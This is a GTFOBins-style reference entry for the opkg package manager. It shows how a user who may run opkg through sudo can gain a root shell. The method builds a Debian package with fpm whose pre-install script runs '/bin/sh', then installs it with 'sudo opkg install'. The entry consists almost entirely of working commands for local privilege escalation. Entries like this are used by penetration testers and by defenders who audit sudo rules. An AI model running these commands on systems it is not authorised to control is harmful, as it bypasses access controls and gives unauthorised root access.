# GTFOBin: opkg

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

It runs an interactive shell using a specially crafted Debian package. Generate it with fpm and upload it to the target.

```
TF=$(mktemp -d)
echo 'exec /bin/sh' > $TF/x.sh
fpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF

```

```
sudo opkg install x_1.0_all.deb
```